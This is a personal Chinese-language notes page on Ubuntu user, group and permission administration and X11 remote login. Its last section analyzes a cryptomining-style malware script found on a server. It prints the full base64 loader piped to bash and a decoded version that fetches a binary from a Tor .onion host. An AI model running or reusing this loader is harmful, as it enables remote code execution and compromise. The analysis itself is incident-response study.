Ubuntu下的用户管理与远程登录


linux简介3|用户与权限管理, 增加sudo权限

emacs 编辑器：http://www.gnuemacs.org/
DB7DW3TQ17

========================================
添加新用户、删除用户
----------------------------------------
建立用户的步骤：http://www.2cto.com/os/201211/167632.html
1).增加用户useradd, 设置密码 passwd; 2).创建家目录 -d 3). 指定shell位置 -s

一步搞定[推荐方式]：
# useradd -s /bin/bash -d /home/sam  -m sam
# passwd sam



1. Ubuntu下带导引的创建用户方式：$ sudo adduser wangjl


2. 添加用户
$ sudo useradd -m -s /bin/bash steven
然后设置密码： 
$ sudo passwd

没有家目录？ 
一步到位的方法是加上 -s /bin/bash 参数。

refer:
http://blog.csdn.net/bxyill/article/details/8076846


3.更多用户操作
删除用户：
语法：userdel [-r] [要删除的用户的名称] 
例如：# userdel -r tete

切换用户
su - wangjl
输入密码即可。


退出登录
logout

修改密码：
passwd
修改自己的密码。





========================================
|-- [批量]添加与删除用户名和密码
----------------------------------------
场景：很多学生要使用机器，需要批量添加用户名，并设置随机密码。
OS: Ubuntu1604
您需要root权限/sudo权限才能进行本文的操作。

已知学生们的学号：
注意一定要删除最后一行的空行！！
$ cat stu_id.txt
2097471001
2097471002
2097471003
2097471004
2097471005
2097471006
2097471007
2097471008
2097471009
2097471010

检查/home/目录：
$ ls /home/
lost+found  songj  wangjl  wjl  www

要点：使用chpasswd更改用户密码
chpasswd是一个批量更改用户密码的命令，它是先读取一个文件，然后根据文件的内容，然后更改密码。
文件内容格式如下：USERNAME:PASS WORD

1. 批量添加用户、添加家目录、设置登录的shell
$ head -n 10 stu_id.txt|awk '{print "sudo useradd -d /home/"$1" -s /bin/bash -m "$1}'
sudo useradd -d /home/2017471001 -s /bin/bash -m 2097471001
sudo useradd -d /home/2017471002 -s /bin/bash -m 2097471002
...

$ head -n 10 stu_id.txt|awk '{print "sudo useradd -d /home/"$1" -s /bin/bash -m "$1}' | bash

检查密码表尾部，确实添加了10个新用户
$ tail -n 11 /etc/passwd

检查home目录，确实添加了10个新文件夹
$ ls /home/




2.批量生成随机密码
$ cat create.sh
#!/bin/bash

n=1
total=10

while(($n<=$total));
        do
			echo $n|md5sum |head -c 6
			echo ""
			let "n++"
        done

$ chmod u+x create.sh
$ ./create.sh > random.txt
$ cat random.txt
b02632
26ab0d
...


3.为用户设置新密码
合并用户名和随机密码，用:隔开
$ paste -d ':' stu_id.txt random.txt
2097471001:b02632
2097471002:26ab0d
...

$ paste -d ':' stu_id.txt random.txt >mima.log

批量导入密码
$ sudo chpasswd<mima.log

密码设置到此结束。


此时，可以尝试使用mima.log中的用户名和密码登录系统了。
2097471008@xxxx:~$ pwd
/home/2097471008



4.批量删除用户
课程结束，需要删除学生用户名和相应的文件。

删除用户
$ awk '{print "sudo userdel "$1}' stu_id.txt |bash
删除家目录文件夹数据
$ awk '{print "sudo rm -fR /home/"$1}' stu_id.txt|bash


或者：
userdel -r username   
-r表示连主目录一起删除。

检查删除效果：
$ tail -n 2 /etc/passwd

$ ls /home


5.more：
如何定期自动更新用户密码？
如何强制删除还在使用的用户账户？
如何对学生用户分组进行管理？限制CPU和内存用量？
	useradd -g test phpq //新建phpq用户并增加到test工作组



refer
1. #使用date 生成随机字符串  
date +%s%N | md5sum | head -c 10  

2. 批量新增用户 http://blog.csdn.net/yanzengzeng/article/details/50529310
3. linux用户管理 http://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html



========================================
sudo指令
----------------------------------------
功能： 以root的身分执行命令
语法： sudo 其他指令
用户： 被root加入『/etc/sudoers』文件中的用户

1．root的密码除了root本人知道外，不需被其他需要用到root权限用户知道，因为使用sudo时，要求输入的密码是『该位用户自己的密码』。

2．把所有可执行sudo指令的用户都规范在『/etc/sudoers』这个文件中，root可以很容易地掌控整个系统。




执行sudo su -成root的用户，我觉得应该和root用户没什么区别吧？

而普通用户使用sudo 来执行只有root才能执行权限的命令，当然跟用root用户执行是不一样的，因为这时候他用的还是普通用户的环境变量啊

补充一下，用su -成root的用户还是有些环境变量是和root登陆是不一样的。另外，它们的uid也是不一样，只有euid是相同的。




========================================
|-- Linux给用户添加sudo权限
----------------------------------------
警告： 赋予普通用户sudo权限有风险，相当于他获得了root权限。谨慎再谨慎！

1. 添加用户到组

usermod -a -G sudo userName2




2. 修改sudoers文件

有时候，linux下面运行sudo命令，会提示类似： 
xxx is not in the sudoers file.  This incident will be reported. 
这里，xxx是用户名称，然后导致无法执行sudo命令，这时候，需要为用户添加sudo权限：

进入超级用户模式。也就是输入"su -",系统会让你输入超级用户密码，输入密码后就进入了超级用户模式。（当然，你也可以直接用root）
添加文件的写权限。也就是输入命令"chmod u+w /etc/sudoers"。 
编辑/etc/sudoers文件。也就是输入命令"vim /etc/sudoers",进入编辑模式，找到这一行：
"root ALL=(ALL) ALL"
在起下面添加
"xxx ALL=(ALL) ALL"
(这里的xxx是你的用户名)，然后保存退出。


把root那行复制后改成hadoop，hadoop就有了sudo权限，需要sudo密码则为ALL，不需要则NOPASSWD:ALL。
root      ALL=(ALL)       NOPASSWD:ALL
wangjl      ALL=(ALL:ALL)   ALL


撤销文件的写权限。也就是输入命令"chmod u-w /etc/sudoers"。 

然后就行了。





http://blog.chinaunix.net/uid-25305993-id-126661.html
http://www.cnblogs.com/linjiqin/archive/2013/03/04/2943255.html
https://www.cnblogs.com/jxhd1/p/6528574.html



========================================
Xming + PuTTY 在Windows下远程Linux主机GUI
----------------------------------------
概述：
1.[免安装]putty实现了ssh安全登录，但是只有命令行界面。
	当你不需要图形界面，不需要传递文件时，putty就够用了。
2.[需要安装]Xming实现了ssh下的图形界面，在需要的时候提供图形界面。
3.[免安装]winscp提供了sftp服务，基于ssh的上传下载文件。


即：X11是X Window System主版本11的缩写，它不光是一个基本的GUI软件，X11也被定义为一个网络协议，因为X11提供了非常灵活的网络访问接口。

SSH X11-Forwarding
只要打开SSH X11-Forwarding后，远程的图形界面就可以通过SSH的加密隧道“拽”到本地的xserver上来，无需手动在远程设置DISPLAY变量。
1. 在win上双击打开 Xming，右下角托盘会有X图标；
2. 双击打开Putty，设置X11-Forwarding方法：Connection -> SSH -> X11 -> X11 frowarding -> Enable X11 forwarding,填写 localhost:0
3. 检查X11 forwarding是否开启方法：登录远程主机后，运行：set | grep DISP 
4.1(for CentOS). 在putty中输入 $ xclock &
windows端应该有Xming时钟窗口弹出。
如果没有该命令，请先安装 $ sudo yum install xclock 

4.2(for Ubuntu).在putty中输入 $ gedit
windows端会出现gedit的编辑图形窗口。
表示成功。

4.3 通用linux
进入R，输入 
> plot(mtcars)
如果出现几行几列的点图，则表示Xming成功。




所需软件：

1） SSH客户端 - 这里我们使用putty
    下载地址：https://www.putty.org/
	http://www.chiark.greenend.org.uk/~sgtatham/putty/

2）X Server端 - 我们使用标准X.Org X server的Windows移植版本Xming
	Xming的介绍见：http://www.straightrunning.com/XmingNotes/
	点击下载下面地址页面里的xming里面的exe文件下载（建议下载最近版）
	http://sourceforge.net/projects/xming/files/
	注意这里面有两个xming和xming-mesa，前者用OpenGL展示界面，后者用Mesa展示界面，对于一般用户差别不大，任选一个即可
3)   字体库：
	点击下载下面地址页面里的xming-fonts里面的字体库exe文件下载（建议下载最近版）
	http://sourceforge.net/projects/xming/files/


	
	
	

调试过程：PuTTY + Xming 远程使用 Linux GUI


    在家里的PC上用VMWare做了一个Oracle Enterprise Linux虚拟机做数据库，虚拟机OEL没启用图形界面，因此需要在PC上装一个X Window Server才能使用GUI。

    看Wiki系统地了解了一下X Window System。X Window System（常被简称为X11或X），是一套基于X display protocol的windowing system，X GUI环境的功能包括窗口的绘制、移动，以及与鼠标、键盘等输入设备的交互。X 协议当前版本为MIT在1987年9月制定的11版----这就是X11的来历，最新版则是2008年9月发布的X11R7.4。

    X采用C/S模型：一个X server 和多个应用程序（client）通信。server接收client的请求绘制窗口，并将来自鼠标、键盘等设备的输入传递给client。

    初学X的用户经常被描述如何远程使用Linux GUI环境的文档搞糊涂：Linux主机上的应用程序被称为client，而用户终端计算机被称为server，看上去好像说反了。实际上，X是从程序结构而非用户或硬件环境的角度来描述的，在用户终端上工作的X server为应用程序提供服务，所以被看作server，而Linux主机上的应用程序接受服务，所以被看作client。

    X server和client可以位于同一计算机上，例如在Linux主机上使用KDE等桌面环境就是这种模式。X server也可以通过同构网络、异构网络或Internet与client通信。

    X server与client之间的通信是不加密的，这个问题可以通过SSH解决。SSH是Secure Shell的简称，SSH可以看作是通信被加密压缩版的telnet。我需要用到SSH的forwarding功能，当X server与client所在计算机都支持SSH协议时，X server与client之间不安全的TCP/IP连接可以转送到（forwarding）二者之间建立的SSH连接上。

    说了一堆概念，现在可以挽起袖子干活了。Linux主机（A, IP: 192.168.1.201）和Windows客户机（B, IP: 192.168.1.101）都已经装好了，我要做的就是在 B 上安装一个X server，一个SSH客户端，在A上启用SSH的X11 forwarding。

1 安装配置B上的X server

X server我选择的是Xming，这是一个免费的windows平台上的X server。需要安装两个组件，主程序和字体
	- Xming X server, Xming-6-9-0-31-setup.exe
	- Xming Fonts, Xming-fonts-7-3-0-22-setup.exe
    运行XLaunch配置Xming X server，将配置保存为.xlaunch 文件。使用默认设置即可。
	Display 代表一套 I/O 设备，包括显示、鼠标、键盘；Display Number 就是这套 I/O 设备的代号；同时 Display Number 还决定了 Xming X server 的 TCP 端口，端口号为 6000 + Display Number。Linux 主机上的应用程序通过此端口建立与 Xming X server 的连接。

    将配置保存为Xming.display.0.xlaunch。双击此文件就能启动X server，系统栏里多了一个Xming的图标。

2 安装配置B上的SSH
    SSH客户端使用PuTTY，PuTTY是freeware+greenware，就一个exe文件。
	配置 Session：配置主机IP，连接方式为SSH
	Connection\Data：保存连接使用的用户名
	Connection\SSH\X11：Enable X11 Forwarding，X display Location 为 localhost:0，这里的 0 就是配置 Xming X server 时指定的 Display Number。
	保存设置为 VSERVER01。

3 配置A上的SSH
    要允许Linux主机上的SSH X转发，查看 /etc/ssh/sshd_config 文件，加入以下一行，
X11Forwrding yes
    至此配置完成。在B上使用PuTTY连接到A，输入xclock &，可以看到X server工作的效果了。
    或者 使用R语言画图，看看效果。
    或者 使用emacs编辑器，试试显示效果。


Xming总体性能，流畅度等不及XManager(付费)： http://www.netsarang.com/
http://www.netsarang.com/xmanager_enterprise_download.html
	

还有其他实现windows下访问X11 forwarding的方案，例如
Cygwin/X - http://x.cygwin.com/
WeirdX - http://www.jcraft.com/weirdx/index.html


refer:
http://blog.csdn.net/defeattroy/article/details/7466018
http://www.zw1840.com/blog/zw1840/2008/10/putty-xming-linux-gui.html
http://blog.sina.com.cn/s/blog_76c55f0a010131i3.html





========================================
Linux用户与组基础
----------------------------------------

用户与组：便于管理；
用户ID为32位，从0开始，为了兼容，ID限制在60000以下；
用户分为3中：
	-root用户 ID为0；
	-系统用户 1-499
	-普通用户 500以上
id命令显示用户ID等信息；
passwd命令可以修改当前密码；


用户相关信息：/etc/下的三个文件：
	passwd（用户信息） 
	shadow（用户密码，加密后的）  
	group（组信息）

查看登陆的用户（命令越长，信息越少。。。）
	whoami 显示当前用户
	who显示那些用户已经登陆系统
	w 显示那些用户已经登陆，并且在干什么

创建用户
	useradd newUSR		#会复制/etc/skel/中的文件复制到新用户家目录中；
	支持如下参数：
		-d 家目录
		-s 登陆shell
		-u userid
		-g 主族
		-G 附属组（最多31个附属组）
修改用户	usermod命令	
删除用户	userdel newUSER		#-r 参数删除家目录


组 - 一般是按照部门分组
创建组	groupadd linux
修改组	groupmod
删除组	groupdel

查看自己的组：groups

例子：
groupadd manage	#创建manage组
useradd -G manage david 	#创建新用户并指定组



========================================
|-- 把已有用户wangjl添加到已有的组docker中
----------------------------------------
$ sudo usermod -a -G docker wangjl
然后切换用户为自己就可以使用docker了
$ su wangjl
$ docker images
$ docker version


使用id命令可以查看用户所属组
$ id
uid=1001(wangjl) gid=1001(wangjl) groups=1001(wangjl),1004(docker)




========================================
|-- 让普通用户拥有root的权限(有风险)
----------------------------------------
1.root登录
2.adduser 用户名
3.passwd 用户名
确定密码

4[重要的是这一步].修改/etc/passwd即可，把用户名的ID和ID组修改成0。



========================================
Linux权限机制: 三种角色ugo，三种权限rwx
----------------------------------------
http://blog.chinaunix.net/uid-20422917-id-1682726.html

ls -l出来的东西：
权限	此文件的用户	此文件的用户组	大小	时间	文件夹名字
drwxr-x--- 2 root GroupA 4096  5月 19 10:10 wangjl


权限三种：读r、写w、执行x;（目录必须有x权限，否则无法查看其内容。）
三种用户区别对待(UGO模型)：权限的UGO模型：user、group、other3组，
	用户u、组g、其他用户o
每三个一组，共9个选项；（第一个d表示是文件夹）
（-r递归的修改文件权限。）


命令chown用以改变文件的所属用户：
	chown linuxUsr mydir 
	-R 参数递归的修改目录下的所有文件的所属用户；
	
命令chgrp用以改变文件的所属组，chgrp oldGroup newGroup 如：
	chgrp groupA GroupDir
	-R 参数递归的修改目录下的所有文件的所属组；

递归的去掉该目录下所有文件和文件夹的user的写权限，可能是为了防止误操作：
$ chmod -R u-w fq_files



#############
问题1：
#############
用root登陆时创建用户，
useradd wjl
然后修改密码：
passwd wjl
输入2遍后即可使用；

用新用户登陆：
su wjl

输入密码，发现没有家目录？ 用-d指定家目录。



1.增加用户组
groupadd remoteUser

2.增加新用户，能分组，没有家目录
useradd -G remoteUser wangjl

删除用户：
userdel 选项 用户名
 - 常用的选项是-r，它的作用是把用户的主目录一起删除。
 - 此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。

root@ubuntu:/home# usermod -s /bin/wangjl -d /home/wangjl -m wangjl

增加新用户，不能分组，有家目录
root@ubuntu:/usr# useradd -d /home/zhuyj -m zhuyj

增加新用户，能分组，有家目录
root@ubuntu:/usr# useradd -d /home/zhuyj -m -G remoteUser zhuyj





#############
问题2：不能使用TAB键、上下键，命令行不显示当前路径的解决
#############
http://www.2cto.com/os/201211/167632.html

因默认ubuntu创建的普通帐号，默认shell为/bin/sh，而这不支持tab等键的，所以将「指定用户」帐号的shell改为/bin/bash就可以了。
 
1).查看当前的shell：
# echo $SHELL
/bin/sh

2).修改shell为/bin/bash：
# usermod -s /bin/bash 用户名

一步到位的方法是加上 -s /bin/bash 参数。






修改权限：
	chmod 模式 文件
模式如下：
ugo分别代表用户、组和其他；
a可以代指ugo；
+ -代表加入或删除相应权限；
r w x代表三种权限；

模式实例：
chmod u+rw wjl
chmod g-x wjl
chmod go+r wjl
chmod a-x wjl

chmod也支持以数字方式修改权限，三个权限分别为：
r =4(2^2)
w =2(2^1)
r =1(2^0)

使用数字权限时，没组权限分别为对应数字之和：
rw=4+2=6
rwx=4+2+1=7
r-w=4+1=5

所以，使用数字表示ugo权限使用如下方式表示：
chmod 660 wjl		==	rw-rw---
chmod 775 wjl		==	rwxrwxr-x




显示所有已有组
groupmod <连按三次tab键>

这会列出现在你系统上的所有用户组，现在添加用户到已存在的组吧，运行下列命令：
sudo adduser 用户名 组名

例如，如果你想添加Richard到sudo组，运行下列命令：
sudo adduser richard sudo

好了，去验证用户的相关组，运行下列命令：
id richard

http://www.linuxidc.com/Linux/2013-10/91947.htm





========================================
 |--【实例】要求为各部门、员工建立相应的工作文件夹
----------------------------------------
1.所有目录、文件在一个文件夹下；
2.每个部门之间不可访问各自的文件夹；
3.每个员工在本部门文件夹下有一个所属文件夹；
4.同部门员工可以查看，但不能修改，用户仅能修改自己的文件夹；


创建组：groupadd gf
创建用户：useradd -G gf zyj
	useradd -G gf dgy
home下创建文件夹：mkdir girl
修改对应组到对应文件夹：chgrp gf girl
不同组不能访问，则去掉o中的权限：
	chmod o-rx girl
	chmod o-rx boy
设置密码：passwd wjl
	passwd zyj
	
登陆其中一个用户：发现确实无法cd进入；

在boy中建立文件夹：mkdir wjl
修改所属用户：chown wjl wjl
去掉o权限：chmod o-rx wjl
修改所属组：chgrp bf wjl





========================================
Linux扩展权限: SUID,SGID
----------------------------------------
除了普通权限外，还有三个特殊权限。
########################################################################
权限	对文件的影响					对目录的影响
suid	以文件的所属用户身份执行，而非执行文件的用户；	无(对目录无效)
sgid	以文件所属组身份执行	在该目录中创建的任意新文件的所属组与该目录的所属组相同
sticky	无(对文件无效)		对目录拥有写入权限的用户仅可以删除其拥有的文件，无法删除其他用户所拥有的文件
########################################################################

设置suid		chmod u+s linuxdir
设置sgid		chmod g+s linuxdir
设置sticky	chmod o+t linuxdir

与普通权限一样，特殊权限也可以使用数字方式表示：
	- SUID =4
	- SGID = 2
	- Sticky = 1
所以，我们可以通过以下命令设置：
chmod 4755 linuxdir




2. 所有者为root的passwd命令
$ ls -l /usr/bin/passwd
-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /usr/bin/passwd

普通用户使用时会以该文件所属用户root身份执行。
这样，passwd就能访问只有root才能访问的密码文件了。
$ ls /etc/shadow -l
----------. 1 root root 4433 Mar 18 16:56 /etc/shadow #CentOS
-rw-r----- 1 root shadow 1885 Dec 30 22:06 /etc/shadow #Ubuntu







========================================
更精细的权限管理：ACL权限控制
----------------------------------------
https://blog.csdn.net/tch918/article/details/10019523






========================================
遇到一个root删除失败的文件！ chattr / lsattr
----------------------------------------
1. 无法删除！
$ sudo rm aa.txt
rm: cannot remove 'aa.txt': Operation not permitted


查看发现有 -i 属性，就是系统不允许对这个文件进行任何的修改
$ lsattr aa.txt
----i---------e--- aa.txt


去掉该属性
$ sudo chattr -i aa.txt

$ lsattr aa.txt
--------------e--- aa.txt

$ rm aa.txt
## 成功删除





2. 命令详解

chattr: 锁定文件，不能删除，不能更改
        +a:  只能给文件添加内容，但是删除不了，
              chattr +a  /etc/passwd
        -d:      不可删除
        加锁：chattr +i  /etc/passwd       文件不能删除，不能更改，不能移动
        查看加锁： lsattr /etc/passwd      文件加了一个参数 i 表示锁定
        解锁：chattr -i /home/omd/h.txt    - 表示解除
#
隐藏chattr命令：

(2) 更多参数
	A：即Atime，告诉系统不要修改对这个文件的最后访问时间。
	S：即Sync，一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘。
	a：即Append Only，系统只允许在这个文件之后追加数据，不允许任何进程覆盖或截断这个文件。如果目录具有这个属性，系统将只允许在这个目录下建立和修改文件，而不允许删除任何文件。
	b：不更新文件或目录的最后存取时间。
	c：将文件或目录压缩后存放。
	d：当dump程序执行时，该文件或目录不会被dump备份。
	D:检查压缩文件中的错误。
	i：即Immutable，系统不允许对这个文件进行任何的修改。如果目录具有这个属性，那么任何的进程只能修改目录之下的文件，不允许建立和删除文件。
	s：彻底删除文件，不可恢复，因为是从磁盘上删除，然后用0填充文件所在区域。
	u：当一个应用程序请求删除这个文件，系统会保留其数据块以便以后能够恢复删除这个文件，用来防止意外删除文件或目录。
	t:文件系统支持尾部合并（tail-merging）。
	X：可以直接访问压缩文件的内容。




ref:
https://www.cnblogs.com/ftl1012/p/chattr.html

========================================
日志查询-登录失败日志
----------------------------------------
1. ubuntu的日志位置
/var/log/auth.log或/var/log/secure 存储来自可插拔认证模块(PAM)的日志，包括成功的登录，失败的登录尝试和认证方式。

/var/log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看 



$ sudo cat /var/log/syslog|head
Apr 22 00:05:40 sustc-HG colord[1089]: message repeated 4 times: [ failed to get session [pid 14373]: No data available]
Apr 22 00:06:12 sustc-HG anacron[14292]: Job `cron.daily' terminated
Apr 22 00:06:12 sustc-HG anacron[14292]: Normal exit (1 job run)
Apr 22 00:15:01 sustc-HG CRON[14542]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
Apr 22 00:17:01 sustc-HG CRON[14546]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Apr 22 00:25:01 sustc-HG CRON[14556]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)





2. 查看登录失败的id
通过查看auth.log，可以分析出用户尝试登录情况，以及退出历史；这里也可以看出有一些非法用户尝试暴力破解或尝试相关用户密码，如果经常这样，就需要找出合理的防范措施，例如，修改默认的ssh端口号，将超级用户密码设置的更合理更复杂些，并定期做出修改等，避免被某些黑客劫持住并作为肉鸡使用。

$ sudo cat /var/log/auth.log | grep Fail | head
Apr 19 01:50:12 sustc-HG sshd[32269]: Failed password for root from 192.168.2.1 port 44398 ssh2
Apr 19 01:50:35 sustc-HG sshd[32271]: Failed password for root from 192.168.2.1 port 55742 ssh2
Apr 19 01:50:54 sustc-HG sshd[32274]: Failed password for root from 192.168.2.1 port 38852 ssh2
Apr 19 01:51:13 sustc-HG sshd[32276]: Failed password for root from 192.168.2.1 port 50196 ssh2
Apr 19 01:51:33 sustc-HG sshd[32278]: Failed password for root from 192.168.2.1 port 33308 ssh2



ubuntu查看日志中访问次数前十的ip
$ sudo cat /var/log/auth.log | grep Fail | awk -F"from" '{print $2}'|cut -d ' ' -f 2 | sort|uniq -c|sort -nr | head






ref:
https://www.jianshu.com/p/989a0e36aa6a
https://www.imooc.com/article/28635






========================================
今天服务器CPU爆表，占用最高的进程最终追踪到这个脚本。这就是暗网？
----------------------------------------
1. 2020.6.27 症状是96个CPU核(总数的一半)100%运行，删掉还是会自启动，都是用root权限运行的。

$cat /opt/unixdb.sh
#!/bin/bash
exec &>/dev/null
echo yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2
echo eXlBTmhaREZPczMxRjlXZ3FPb3Z1cnJ1RU1UM1ordjgyTUcwbTllbGFmaDhHVTErdTQvNzhOWm9LejJyQTdPMgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ1bml4ZGJudWFkeG13dG9iIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash


主程序是base64加密过的。




2. 最后一行解码后展开
yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2
exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "unixdbnuadxmwtob")

sockz() {
	n=(dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz)                                                                                                     
	p=$(echo "dns-query?name=relay.tor2socks.in")
	s=$($c https://${n[$((RANDOM%5))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
}

fexe() {
	for i in $d /tmp /var/tmp /dev/shm /usr/bin ;
	do 
		echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;
	done 
}

u() {
	sockz
	fexe
	f=/int.$(uname -m)
	x=./$(date|md5sum|cut -f1 -d-)
	$c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
	# chmod +x $x;$x;rm -f $x #这一句可能有危害，已经注释掉了。确定想测试一下危害，请去掉前面的注释符。
}

for h in tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su
do
	if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; then
		u $t.$h
		else
		break
	fi
done





3. 逐行分析
(1) sockz() 函数
curl -4fsSLkA- -m200 一个http网址，随机5选1主域名，比如  https://dns.twnic.tw/dns-query?name=relay.tor2socks.in
浏览器打开后是：
{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"relay.tor2socks.in.","type":1}],"Answer":[{"name":"relay.tor2socks.in.","type":1,"TTL":2389,"Expires":"Sat, 27 Jun 2020 06:19:21 UTC","data":"91.134.214.222"},...
{"name":"relay.tor2socks.in.","type":1,"TTL":2389,"Expires":"Sat, 27 Jun 2020 06:19:21 UTC","data":"128.65.194.136"}],"edns_client_subnet":"116.6.234.0/0"}

grep 匹配出IP，然后tr替换掉空格，然后sort -u是unique, -R是随机排序，然后head拿到第一个IP地址，赋值给s

(2) fexe() 不清楚干啥的
(3) $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
访问(1)中s给出的IP的9050端口，前面定义过t，合起来就是 unixdbnuadxmwtob.onion/initx86_64
x是一个日期的md5码，相当于随机数
curl -4fsSLkA- -m200 -x socks5h://145.239.64.40:9050 unixdbnuadxmwtob.onion/initx86_64 -o ./f36a6ba953e465270ecc0fb97bc7dcb6
动作要快，否则IP可能失效，导致下载失败。可以使用原脚本，删除掉运行那一行。
下载到一个26k的文件。不知道是干啥的，不敢运行。



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------

